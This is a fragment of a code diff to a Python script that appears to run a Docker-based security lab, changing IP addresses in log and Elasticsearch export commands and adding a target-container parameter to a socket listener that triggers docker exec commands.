+            filedata = filedata.replace('172.28.0.1:', '172.28.0.157:')
 
             with open("{}/{}".format(output_fldr,os.path.basename(file)), 'w') as file_out:
                 file_out.write(filedata)
@@ -1372,8 +1312,6 @@ def log_clean_up(pcap_file_to_cleanup,container_logs_to_recover, suricata_log_di
     running_containers = [x.name for x in containers_objects]
 
     for container in container_logs_to_recover:
-
-        #if container in running_containers:
 
         bits, _ = api_client.get_archive(container, '/var/log/syslog')
 
@@ -1395,15 +1333,15 @@ def log_clean_up(pcap_file_to_cleanup,container_logs_to_recover, suricata_log_di
 
     # Need to dynamically pull the filebeat indices and then we should be good to just parse as a docker command
 
-    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_mapping.json --type=mapping
-    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp ^Casticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_analyzer.json --type=analyzer
-    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_data.json --type=data
+    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.28.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_mapping.json --type=mapping
+    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp ^Casticdump/elasticsearch-dump --input=http://172.28.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_analyzer.json --type=analyzer
+    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.28.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_data.json --type=data
 
 
     print("\Stopping logging - Output files saved in {} - Containers are still running".format(output_fldr))
 	
 
-def listen(ip,port,cmd,target_os):
+def listen(ip,port,cmd,target_os,target_container):
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.bind((ip, port))
@@ -1418,8 +1356,22 @@ def listen(ip,port,cmd,target_os):
         if target_os.__contains__("alpine"):
             os_shell = "ash"
 
-        wrapper_cmd = 'docker exec -it target {} -c "{}"'.format(os_shell,cmd)
+        wrapper_cmd = 'docker exec -it {} {} -c "{}"'.format(target_container,os_shell,cmd)
             
         subprocess.run(['gnome-terminal', '-x', 'bash', '-c', wrapper_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
 
         conn.close()
+
+def get_uwe_net_interface(ip_addr):
+
+	uwe_net_interface = ""
+
+	addrs = psutil.net_if_addrs()
+	
+	for key, val in addrs.items():
+		for i in val:
+			if ip_addr in i:
+				uwe_net_interface = key
+				break
+	
+	return uwe_net_interface
